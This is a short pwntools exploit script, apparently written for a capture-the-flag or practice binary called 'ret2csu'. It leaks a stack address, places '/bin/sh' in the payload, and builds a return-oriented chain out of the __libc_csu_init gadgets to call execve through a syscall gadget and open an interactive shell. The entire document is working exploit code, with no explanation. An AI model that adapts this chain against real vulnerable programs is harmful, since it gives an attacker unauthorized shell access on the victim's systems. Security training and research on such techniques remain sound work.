from pwn import *
from LibcSearcher import *

io = process("./ret2csu")
elf = ELF("./ret2csu")

csu_front = 0x400580
csu_rear = 0x40059B
main_addr = 0x400587
execve_call = 0x4004E2
vuln_addr = 0x4004ED
rdi_addr = 0x4005A3
syscall = 0x400501

#context.log_level = 'debug'
payload_leak = b'/bin/sh\x00' + b'A' * 8 + p64(vuln_addr)
io.sendline(payload_leak)
io.recv(0x20)
stack_addr = u64(io.recv(8))
print(hex(stack_addr))
bin_sh_addr = stack_addr - 0x148
payload = b'/bin/sh\x00' + p64(rdi_addr) + p64(csu_rear)
payload += p64(0) + p64(bin_sh_addr + 0x08) + p64(0) + p64(0) + p64(bin_sh_addr)
payload += p64(csu_front) + p64(execve_call) + p64(rdi_addr) + p64(bin_sh_addr) + p64(syscall)

io.sendline(payload)
io.interactive()